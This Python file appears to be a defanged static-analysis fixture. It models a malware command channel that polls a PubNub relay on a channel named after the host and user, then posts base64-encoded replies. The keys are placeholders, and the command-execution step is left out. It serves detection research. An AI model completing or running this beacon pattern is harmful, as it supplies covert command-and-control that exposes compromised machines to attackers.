# Representative variant of the article's Type A transport; not campaign bytes.
# Nonfunctional fixture keys. Never execute this static-analysis fixture.
import base64
import getpass
import json
import socket
import subprocess
import urllib.parse
import urllib.request

channel = socket.gethostname() + '-' + getpass.getuser()
cursor = '0'
while True:
    packet = urllib.request.urlopen('https://ps.pndsn.com/subscribe/sub-c-fixture/' + channel + '/0/' + cursor).read()
    response = json.loads(packet.decode('utf-8'))
    cursor = response[1]
    if response[0]:
        result = b'chat message'
        encoded = base64.b64encode(result).decode('ascii')
        message = urllib.parse.quote(json.dumps(encoded), safe='')
        urllib.request.urlopen('https://ps.pndsn.com/publish/pub-c-fixture/sub-c-fixture/0/' + channel + '/0/' + message).read()
